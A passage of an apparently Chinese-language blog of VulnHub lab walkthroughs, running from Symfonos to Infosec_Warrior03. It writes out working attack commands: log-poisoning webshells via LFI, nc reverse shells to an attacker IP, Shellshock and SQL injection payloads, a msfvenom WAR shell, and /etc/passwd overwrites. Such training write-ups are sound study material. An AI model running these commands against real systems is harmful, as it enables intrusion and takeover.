/></p><p><code>http://192.168.88.130/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&amp;pass=nc -e /bin/bash 192.168.88.129 8081</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/16.png" alt="" /></p><h2 id="权限提升-26"><a class="markdownIt-Anchor" href="#权限提升-26"></a> 权限提升</h2><p>查看具有SUID的程序</p><p><code>find / -user root -perm -4000 -print 2&gt; /dev/null</code><br /><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/17.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/18.png" alt="" /></p><p>可以进行PATH提权</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/19.png" alt="" /></p><hr /><blockquote><p>SMTP+LFI=GetShell</p></blockquote><ul><li>通过SMTP写入WebShel的内容（需要已知一个系统的用户名）</li><li>再利用LFI来执行WebShell（Web包含可以访问/var/mail）</li></ul><p>参考资料</p><blockquote><p><a href="https://medium.com/@markonsecurity/symfonos-1-walkthrough-vulnhub-df08dbcb0d36">WalkThrough</a></p></blockquote><hr /><h1 id="symfonos-3"><a class="markdownIt-Anchor" href="#symfonos-3"></a> <a href="https://www.vulnhub.com/entry/symfonos-31,332/">symfonos 3</a></h1><p><code>2020/07/05 15:27:23</code></p><h2 id="寻找靶机ip-11"><a class="markdownIt-Anchor" href="#寻找靶机ip-11"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.88.0/24 | grep -B2 VMware</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/00.png" alt="" /></p><h2 id="端口扫描-27"><a class="markdownIt-Anchor" href="#端口扫描-27"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.88.130</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/01.png" alt="" /></p><h2 id="web路径扫描-11"><a class="markdownIt-Anchor" href="#web路径扫描-11"></a> Web路径扫描</h2><p><code>dirb http://192.168.88.130/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/02.png" alt="" /></p><h2 id="漏洞利用-27"><a class="markdownIt-Anchor" href="#漏洞利用-27"></a> 漏洞利用</h2><p>访问页面，在源代码出得到信息</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/03.png" alt="" /></p><p>尝试后发现存在路径<code>/cgi-bin/underworld</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/04.png" alt="" /></p><p>使用ShellShock漏洞反弹Shell<br /><code>curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; http//192.168.88.130/cgi-bin/underworld</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/05.png" alt="" /></p><h2 id="权限提升-27"><a class="markdownIt-Anchor" href="#权限提升-27"></a> 权限提升</h2><p>获取pty</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/06.png" alt="" /></p><p>查找属于用户组hades的文件</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/07.png" alt="" /></p><p>查看statuscheck.txt</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/08.png" alt="" /><br />应该是curl请求的结果</p><p>下载pspy</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/09.png" alt="" /></p><p>运行pspy之后得到信息</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/10.png" alt="" /><br />python2脚本<code>ftpclient.py</code>为计划任务</p><p>靶机上存在tcpdump</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/11.png" alt="" /></p><p>使用tcpdump监听流量<br /><code>timeout 120 tcpdump -v -i lo port 21</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/12.png" alt="" /></p><p>得到账户<code>hades:PTpZTfU4vxgzvRBE</code></p><p>使用ssh登入靶机后查看脚本文件</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/13.png" alt="" /><br />文件不可写，且目录无法操作</p><p>查看库文件<code>ftplib</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/14.png" alt="" /><br />库文件可写</p><p>修改库文件中的ftp.quit()函数</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/15.png" alt="" /><br />插入反弹Shell命令</p><p>提权成功</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/16.png" alt="" /></p><hr /><blockquote><p>ShellShock</p></blockquote><ul><li>apache</li><li>/cgi-bin/* (200)</li></ul><p>参考资料</p><blockquote><p><a href="https://infosecjohn.blog/posts/vulnhub-symfonos-3/">WalkThrough</a></p></blockquote><hr /><h1 id="symfonos-4"><a class="markdownIt-Anchor" href="#symfonos-4"></a> <a href="https://www.vulnhub.com/entry/symfonos-4,347/">symfonos 4</a></h1><p><code>2020/07/20 11:00:24</code></p><h2 id="寻找靶机ip-12"><a class="markdownIt-Anchor" href="#寻找靶机ip-12"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/00.png" alt="" /></p><h2 id="端口扫描-28"><a class="markdownIt-Anchor" href="#端口扫描-28"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.145</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/01.png" alt="" /></p><h2 id="web路径扫描-12"><a class="markdownIt-Anchor" href="#web路径扫描-12"></a> Web路径扫描</h2><p><code>gobuster dir -u 192.168.31.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/02.png" alt="" /></p><h2 id="漏洞利用-28"><a class="markdownIt-Anchor" href="#漏洞利用-28"></a> 漏洞利用</h2><p>访问<code>/atlantis.php</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/03.png" alt="" /></p><p>使用SQL注入Bypass登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&#39; or 1#</span><br><span class="line">password&#x3D;1</span><br></pre></td></tr></table></figure><p>登入后跳转至<code>/sea.php</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/04.png" alt="" /></p><p>选择Hades之后出现文字内容</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/05.png" alt="" /><br />也出现了Get参数<code>file</code></p><p>访问<code>/gods</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/06.png" alt="" /><br />可能存在本地文件包含漏洞，且文件名后面会补上<code>.log</code></p><p>尝试包含登入日志<br /><code>/sea.php?file=../../../../var/log/auth</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/07.png" alt="" /><br />存在本地文件包含漏洞</p><p>ssh登入构造Webshell<br /><code>ssh '&lt;?php system($_GET['pass']); ?&gt;'@192.168.31.145</code></p><p>反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9901</span><br><span class="line">&#x2F;sea.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth&amp;pass&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.31.10 9901</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/08.png" alt="" /></p><h2 id="权限提升-28"><a class="markdownIt-Anchor" href="#权限提升-28"></a> 权限提升</h2><p>获取tty<br /><code>python -c 'import pty;pty.spawm(&quot;/bin/bash&quot;)'</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/09.png" alt="" /></p><p>查看本地服务<br /><code>ss -antlp</code><br /><code>ps -auxwww | grep 127.0.01</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/10.png" alt="" /></p><p>端口转发<br /><code>socat tcp-listen:1234,fork tcp-connect:localhost:8080</code></p><p>访问<code>http://192.168.31.145:1234/</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/11.png" alt="" /></p><p>查看cookie</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/12.png" alt="" /></p><p>Base64解码</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/13.png" alt="" /></p><p>可能存在pickle反序列化漏洞，构造反弹Shell的Payload</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/14.png" alt="" /></p><p>发送Payload</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/15.png" alt="" /><br />提权成功</p><hr /><blockquote><p>jsonpickle反序列化</p></blockquote><p>在进行反序列化的时候会执行<code>函数reduce</code>类似于php反序列化中的wakeup()</p><p>参考资料</p><blockquote><p><a href="https://www.hackingarticles.in/symfonos4-vulnhub-walkthrough/">WalkThrough</a><br /><a href="https://pentesterjourney.com/tag/symfonos4/">WalkThrough</a><br /><a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">pickel</a></p></blockquote><hr /><h1 id="nullbyte"><a class="markdownIt-Anchor" href="#nullbyte"></a> <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">NullByte</a></h1><p><code>2020/07/31 10:52:00</code></p><h2 id="寻找靶机ip-13"><a class="markdownIt-Anchor" href="#寻找靶机ip-13"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/00.png" alt="" /></p><h2 id="端口扫描-29"><a class="markdownIt-Anchor" href="#端口扫描-29"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.234</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/01.png" alt="" /></p><h2 id="web路径扫描-13"><a class="markdownIt-Anchor" href="#web路径扫描-13"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.234/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/02.png" alt="" /></p><h2 id="漏洞利用-29"><a class="markdownIt-Anchor" href="#漏洞利用-29"></a> 漏洞利用</h2><p>访问Web页面</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/03.png" alt="" /></p><p>下载图片并分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;192.168.31.234&#x2F;main.gif</span><br><span class="line">exiftool main.gif</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/04.png" alt="" /></p><p>访问目录<code>/kzMb5nVYJw</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/05.png" alt="" /></p><p>查看源代码</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/06.png" alt="" /></p><p>使用Burpsuite对POST参数<strong>key</strong>进行爆破<br />字典文件为<code>/usr/share/wordlists/dirb/big.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/07.png" alt="" /></p><p>输入key之后页面变化</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/08.png" alt="" /></p><p>提交<code>usrtosearch</code>参数进行查询</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/09.png" alt="" /></p><p>直接访问<code>420search.php</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/10.png" alt="" /></p><p>猜测该php文件可以对数据库进行查询，可能存在SQL注入</p><p>提交参数<code>usrtosearch=admin&quot; or 1=1%23</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/11.png" alt="" /></p><p>确认存在SQL注入</p><p>使用SQLMap</p><p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin --dbs --batch</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/12.png" alt="" /></p><p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth --tables --batch</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/13.png" alt="" /></p><p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth -T users --columns --batch</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/14.png" alt="" /></p><p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth -T users -C id,position,user,pass --dump --batch</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/15.png" alt="" /></p><p>Base64解码</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/16.png" alt="" /></p><p>Hash破解</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/17.png" alt="" /></p><p>使用该账户登入SSH</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/18.png" alt="" /></p><h2 id="权限提升-29"><a class="markdownIt-Anchor" href="#权限提升-29"></a> 权限提升</h2><p>查看文件<code>~/.bash_history</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/19.png" alt="" /><br />存在文件<code>/var/www/backup/procwatch</code></p><p>文件执行<code>ps</code>命令，且具有SUID权限</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/20.png" alt="" /></p><p>进行PATH提权</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/21.png" alt="" /></p><hr /><p>参考资料</p><blockquote><p><a href="https://medium.com/@pharish4948/vulnhub-null-byte-walkthrough-bde63c1dd38d">WalkThrough</a></p></blockquote><hr /><h1 id="breach1"><a class="markdownIt-Anchor" href="#breach1"></a> <a href="https://www.vulnhub.com/entry/breach-1,152/">Breach1</a></h1><p><code>2020/09/06 11:35:19</code></p><h2 id="寻找靶机ip-14"><a class="markdownIt-Anchor" href="#寻找靶机ip-14"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.110.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/00.png" alt="" /></p><h2 id="端口扫描-30"><a class="markdownIt-Anchor" href="#端口扫描-30"></a> 端口扫描</h2><p><code>nmap --top-port 200 -sV -T5 -v -n 192.168.110.140</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/01.png" alt="" /></p><p>目标靶机存在IDS/IPS</p><h2 id="web路径扫描-14"><a class="markdownIt-Anchor" href="#web路径扫描-14"></a> Web路径扫描</h2><p><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.110.140/</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/02.png" alt="" /></p><h2 id="漏洞利用-30"><a class="markdownIt-Anchor" href="#漏洞利用-30"></a> 漏洞利用</h2><p>使用浏览器访问Web页面</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/03.png" alt="" /></p><p>查看源代码</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/04.png" alt="" /></p><p>两次Base64解码后得到<br /><code>pgibbons:damnitfeel$goodtobeagang$ta</code></p><p>图片导向其他页面</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/05.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/06.png" alt="" /></p><p>点击<code>Employee portal</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/07.png" alt="" /></p><p>使用账户登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: pgibbons</span><br><span class="line">password: damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/08.png" alt="" /></p><p>在第三封邮件中获得有效信息</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/09.png" alt="" /></p><p>keystore文件<br /><code>192.168.110.140/.keystore</code></p><p>查看Contributions</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/10.png" alt="" /></p><p>可以进一步获得信息</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/11.png" alt="" /></p><p>这里可以再获取一个流量包文件<br /><code>http://192.168.110.140/impresscms/_SSL_test_phase1.pcap</code><br />并且得知密码为<code>tomcat</code></p><p>查看keystore所存储的私钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -keystore keystore</span><br><span class="line">tomcat</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/12.png" alt="" /></p><p>导出p12证书</p><p><code>keytool -importkeystore -srckeystore keystore -destkeystore keystore.p12 -deststoretype pkcs12</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/13.png" alt="" /></p><p>使用Wireshark分析流量包</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/14.png" alt="" /></p><p>目标靶机的8443端口可能存在加密Web服务</p><p>导入证书文件<br /><code>Edit -&gt; Preferences -&gt; Protocols -&gt; TLS -&gt; Edit...</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/15.png" alt="" /></p><p>导入之后即可解密TLS流量</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/16.png" alt="" /></p><p>对于Basic认证内容进行Base64解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC&#39; | base64 -d</span><br><span class="line">tomcat:Tt\5D8F(#!*u&#x3D;G)4m7zB</span><br></pre></td></tr></table></figure><p>访问<code>https://192.168.110.140:8443/_M@nag3Me/html</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/17.png" alt="" /></p><p>认证错误，使用Burpsuite代理</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/18.png" alt="" /></p><p>使用账户登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: tomcat</span><br><span class="line">password: Tt\5D8F(#!*u&#x3D;G)4m7zB</span><br></pre></td></tr></table></figure><p>构造恶意war包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;9902 -f raw &gt; msf.jsp</span><br><span class="line">zip msf.zip msf.jsp</span><br><span class="line">mv msf.zip msf.war</span><br></pre></td></tr></table></figure><p>上传war包</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/19.png" alt="" /></p><p>在MSFConsole中进行配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload java&#x2F;jsp_shell_reverse_tcp</span><br><span class="line">set LHOST 192.168.110.3</span><br><span class="line">set LPORT 9902</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>访问URL<code>https://192.168.110.140:8443/msf/msf.jsp</code></p><p>MSFConsole中接收到Shell</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/20.png" alt="" /></p><h2 id="权限提升-30"><a class="markdownIt-Anchor" href="#权限提升-30"></a> 权限提升</h2><p>mysql空口令登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root</span><br><span class="line">select user,password from mysql.user;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/21.png" alt="" /></p><p>破解MD5值</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/22.png" alt="" /></p><p><code>thelaststraw</code></p><p>切换账户至milton</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su milton</span><br><span class="line">thelaststraw</span><br></pre></td></tr></table></figure><p>下载图片，查看EXIF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.110.140&#x2F;images&#x2F;bill.png</span><br><span class="line">exiftool bill.png</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/23.png" alt="" /></p><p>得到密码<br /><code>coffeestains</code></p><p>切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su blumbergh</span><br><span class="line">coffeestains</span><br></pre></td></tr></table></figure><p>开启本地HTTP服务<br /><code>python -m SimpleHTTPServer 9900&amp;</code><br /><img src="/images/vulnhub_walkthrough_set/Breach1/img/24.png" alt="" /></p><p>靶机下载pspy<br /><code>wget http://192.168.110.3:9900/pspy64</code><br /><img src="/images/vulnhub_walkthrough_set/Breach1/img/25.png" alt="" /></p><p>使用pspy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x pspy64</span><br><span class="line">.&#x2F;pspy64 | grep UID&#x3D;0 &amp;</span><br></pre></td></tr></table></figure><p>可以看到root执行的命令<code>/bin/sh -c /usr/share/cleanup/tidyup.sh</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/26.png" alt="" /></p><p>查看sudo权限，<a href="http://xn--teeshelltidy-c86sfa42ubzn74jkraw8few0g3i5f72sc.sh">可以使用tee写反弹shell命令至tidy.sh</a><br />root执行反弹shell命令之后即可获得root权限</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/27.png" alt="" /></p><p><code>echo 'nc -e /bin/bash 192.168.110.3 9903' | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</code></p><p><code>nc -lvnp 9903</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/28.png" alt="" /></p><hr /><blockquote><p>keystore</p></blockquote><p>可以使用keytool查看并导出keystore中所存储的密钥文件</p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/zhuxr/p/9848230.html">WalkThrough</a></p></blockquote><hr /><h1 id="infosec_warrior02"><a class="markdownIt-Anchor" href="#infosec_warrior02"></a> <a href="https://www.vulnhub.com/entry/infosecwarrior-ctf-2020-02,447/">Infosec_Warrior02</a></h1><p><code>2020/09/09 12:46:57</code></p><h2 id="寻找靶机ip-15"><a class="markdownIt-Anchor" href="#寻找靶机ip-15"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/00.png" alt="" /></p><h2 id="端口扫描-31"><a class="markdownIt-Anchor" href="#端口扫描-31"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.1.109</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/01.png" alt="" /></p><h2 id="漏洞利用-31"><a class="markdownIt-Anchor" href="#漏洞利用-31"></a> 漏洞利用</h2><p>使用nc连接目标56563端口</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/02.png" alt="" /></p><p>尝试输入非预期输入</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/03.png" alt="" /></p><p>得到报错信息</p><p>可以利用input()函数进行RCE<br />payload: <code>__import__(&quot;os&quot;).system(&quot;/bin/bash&quot;)</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/04.png" alt="" /></p><p>获取Shell</p><h2 id="权限提升-31"><a class="markdownIt-Anchor" href="#权限提升-31"></a> 权限提升</h2><p>SSH登入时得到信息</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/05.png" alt="" /></p><p>查看发型版的代号<br /><code>cat /etc/*release</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/06.png" alt="" /></p><p>查看主机名与用户名</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/07.png" alt="" /></p><p>构造账户</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/08.png" alt="" /></p><p><code>hydra -I -L user -P pass -e n ssh://192.168.1.109</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/09.png" alt="" /></p><p>得到账户 <code>ck04:bionic</code></p><p>SSH登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh ck04@192.168.1.109 -p bionic</span><br><span class="line">bionic</span><br></pre></td></tr></table></figure><p>输入命令之后ssh断开连接</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/10.png" alt="" /></p><p>查看ck04用户的默认Shell</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/11.png" alt="" /></p><p>构造反弹shell脚本并执行</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/12.png" alt="" /></p><p>获取tty</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/13.png" alt="" /></p><p>查看ck04用户的sudo权限并利用</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/14.png" alt="" /></p><p>查看bla用户的sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/15.png" alt="" /></p><p>使用unzip命令覆盖passwd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">$6$qKge9GxrDANmLdaL$KZsmUQjuwSCG5TOZoBJW80ECpul61n9RbTRe03iL2qbdodW2bS1u2kpCHnpF.wEF4nulOxUxmkhRo&#x2F;OpUmyxe1</span><br><span class="line">echo &#39;test:$6$qKge9GxrDANmLdaL$KZsmUQjuwSCG5TOZoBJW80ECpul61n9RbTRe03iL2qbdodW2bS1u2kpCHnpF.wEF4nulOxUxmkhRo&#x2F;OpUmyxe1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwd</span><br><span class="line">zip new.zip passwd</span><br><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;unzip new.zip -d &#x2F;etc</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/16.png" alt="" /></p><hr /><blockquote><p>python2 input()</p></blockquote><p>python2的函数input()会执行输入的数据，插入python命令即可Getshell或反弹Shell，而使用函数raw_input()则不会执行命令</p><p>参考资料</p><blockquote><p><a href="https://hack-tips.com/2020/04/13/vulnhub-infosecwarrior-ctf-2020-02walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="infosec_warrior03"><a class="markdownIt-Anchor" href="#infosec_warrior03"></a> <a href="https://www.vulnhub.com/entry/infosecwarrior-ctf-2020-03,449/">Infosec_Warrior03</a></h1><p><code>2020/09/21 19:24:32</code></p><h2 id="寻找靶机ip-16"><a class="markdownIt-Anchor" href="#寻找靶机ip-16"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.110.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/00.png" alt="" /></p><h2 id="端口扫描-32"><a class="markdownIt-Anchor" href="#端口扫描-32"></a> 端口扫描</h2><p><code>nmap -p- -A -T5 -v -n 192.168.110.6</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/01.png" alt="" /></p><h2 id="web路径扫描-15"><a class="markdownIt-Anchor" href="#web路径扫描-15"></a> Web路径扫描</h2><p><code>dirb http://192.168.110.6/</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/02.png" alt="" /></p><h2 id="漏洞利用-32"><a class="markdownIt-Anchor" href="#漏洞利用-32"></a> 漏洞利用</h2><p>访问<code>http://192.168.110.6/phpMyAdmin/</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/03.png" alt="" /></p><p>使用弱口令登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:root</span><br><span class="line">password:root</span><br></pre></td></tr></table></figure><p>查询mysql.user中的账户信息</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/04.png" alt="" /></p><p>得到两个账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">krishna:4DC8EC6204F12795FE54CC79FFA2A8579A947D04</span><br></pre></td></tr></table></figure><p>进行md5查询之后得到明文口令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:root</span><br><span class="line">krishna:infosec</span><br></pre></td></tr></table></figure><p>尝试使用<code>krishna:infosec</code>登入SSH服务</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/05.png" alt="" /></p><h2 id="权限提升-32"><a class="markdownIt-Anchor" href="#权限提升-32"></a> 权限提升</h2><p>查看sudo权限</p><p><img 